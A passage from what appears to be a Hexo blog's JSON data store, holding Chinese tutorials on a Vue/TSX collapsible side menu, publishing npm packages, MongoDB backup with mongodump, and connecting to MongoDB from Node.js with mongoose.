&apos;服务项目&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./server&apos;,</span><br><span class=\"line\">        name: &apos;服务项目&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;施工案例&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;成品保护&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;保洁&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;外墙清洗&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;石材翻新&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;家政服务&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;电梯司机&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;停车管理&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;消防工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;拆迁工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;团队风采&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;风采展示&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;新闻中心&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;新闻中心&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;人才招聘&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;招聘详情&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;联系我们&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;联系方式&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p><code>数据结构</code> 决定 <code>业务逻辑</code> 与 <code>实现思路</code></p>\n<hr>\n<h3 id=\"第二步-根据数据实现虚拟DOM\"><a href=\"#第二步-根据数据实现虚拟DOM\" class=\"headerlink\" title=\"第二步 根据数据实现虚拟DOM\"></a>第二步 根据数据实现虚拟DOM</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public listFor(h: CreateElement) &#123;</span><br><span class=\"line\">  let res = [];</span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = [];</span><br><span class=\"line\">    for (let n = 0; n &lt; this.list[i].item.length; n++) &#123;</span><br><span class=\"line\">        dd.push(</span><br><span class=\"line\">          &lt;span&gt;</span><br><span class=\"line\">            &lt;router-link to=&#123;this.list[i].item[n].url&#125;&gt;&#123;this.list[i].item[n].name&#125;&lt;/router-link&gt;</span><br><span class=\"line\">          &lt;/span&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res.push(</span><br><span class=\"line\">      &lt;dl&gt;</span><br><span class=\"line\">        &lt;dt onClick=&#123;() =&gt; &#123; this.cardList(i + 1) &#125;&#125;&gt;</span><br><span class=\"line\">          &lt;span class=&#123;this.listNum === i + 1 ? &apos;show&apos; : &apos;&apos;&#125;&gt;&#123;this.list[i].card&#125;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/dt&gt;</span><br><span class=\"line\">        &lt;dd class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;&gt;</span><br><span class=\"line\">          &#123;dd&#125;</span><br><span class=\"line\">        &lt;/dd&gt;</span><br><span class=\"line\">      &lt;/dl &gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return res</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"第三步-两个生命周期\"><a href=\"#第三步-两个生命周期\" class=\"headerlink\" title=\"第三步 两个生命周期\"></a>第三步 两个生命周期</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// vue生命周期 挂载时执行</span><br><span class=\"line\">public mounted() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// vue生命周期 页面数据更新时执行</span><br><span class=\"line\">public updated() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步-业务逻辑\"><a href=\"#第四步-业务逻辑\" class=\"headerlink\" title=\"第四步 业务逻辑\"></a>第四步 业务逻辑</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public showdd() &#123;</span><br><span class=\"line\">  let sideMenu = document.getElementsByClassName(&apos;sideMenu&apos;)[0];</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 此循环为了每次点击前所有列表高度清零</span><br><span class=\"line\">  for (let i = 0; i &lt; sideMenu.children.length; i++) &#123;</span><br><span class=\"line\">    let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\">    evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = sideMenu.getElementsByClassName(`showdd$&#123;i&#125;`)[0];</span><br><span class=\"line\">    </span><br><span class=\"line\">    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据</span><br><span class=\"line\">    if (dd !== undefined) &#123;</span><br><span class=\"line\">      dd.setAttribute(&apos;style&apos;, `height:$&#123;itemLen * 36&#125;px`)</span><br><span class=\"line\">      console.log(&apos;get H&apos;, dd.clientHeight);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(itemLen);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第五步-CSS样式\"><a href=\"#第五步-CSS样式\" class=\"headerlink\" title=\"第五步 CSS样式\"></a>第五步 CSS样式</h3><p>此步骤为样式的实现，根据 <code>class</code> 或 <code>id</code> 实现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ele&#123;</span><br><span class=\"line\">    overflow: hidden;</span><br><span class=\"line\">    opacity: 0; // 不太需要</span><br><span class=\"line\">    height: 0;</span><br><span class=\"line\">    transition: all .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ele.show &#123;</span><br><span class=\"line\">    opacity: 1; // 可以省略</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>具体实现详见 <code>shrs</code>  四海日盛官网项目 <code>list.tsx</code></p>\n"},{"title":"npm 上传包","date":"2018-05-08T02:53:07.000Z","archives":"npm","_content":"# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","source":"_posts/NodeJS/NPM/npm-上传包.md","raw":"---\ntitle: npm 上传包\ndate: 2018-05-08 10:53:07\ntags: npm 上传包\narchives: npm \ncategories: NPM\n---\n# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","slug":"NodeJS/NPM/npm-上传包","published":1,"updated":"2018-05-08T03:14:25.458Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2d3007ob8xjkm3eoqni","content":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li>github新建项目，上传项目，根据杨清项目配置</li>\n<li>配置好项目 npm login </li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li>github新建项目，上传项目，根据杨清项目配置</li>\n<li>配置好项目 npm login </li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n"},{"title":"MongoDB--备份与恢复","date":"2018-04-16T07:10:13.000Z","archives":"SQL","_content":"## [备份(`mongodump`)与恢复(`mongorestore`)](http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n\n### **数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\n\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbDirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","source":"_posts/SQL/NoSql/MongoDB-备份与恢复.md","raw":"---\ntitle: MongoDB--备份与恢复\ndate: 2018-04-16 15:10:13\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n## [备份(`mongodump`)与恢复(`mongorestore`)](http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n\n### **数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\n\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbDirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","slug":"SQL/NoSql/MongoDB-备份与恢复","published":1,"updated":"2018-06-25T06:23:42.029Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2d5007rb8xjvaaphx3a","content":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a><a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</a></h2><h3 id=\"数据备份-mongodump\"><a href=\"#数据备份-mongodump\" class=\"headerlink\" title=\"数据备份(mongodump)\"></a><strong>数据备份</strong>(mongodump)</h3><p>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。</p>\n<p>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。</p>\n<p><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbDirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a><a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</a></h2><h3 id=\"数据备份-mongodump\"><a href=\"#数据备份-mongodump\" class=\"headerlink\" title=\"数据备份(mongodump)\"></a><strong>数据备份</strong>(mongodump)</h3><p>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。</p>\n<p>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。</p>\n<p><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbDirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n"},{"title":"MongoDB在Node.js中的使用","date":"2018-04-16T06:03:08.000Z","archives":"SQL","_content":"#### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n","source":"_posts/SQL/NoSql/MongoDB-Node.js中的使用.md","raw":"---\ntitle: MongoDB在Node.js中的使用\ndate: 2018-04-16 14:03:08\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n#### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n","slug":"SQL/NoSql/MongoDB-Node.js中的使用","published":1,"updated":"2018-06-25T06:23:39.240Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2d7007vb8xjoib31xxv","content":"<h4 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h4><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: &apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h4><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: 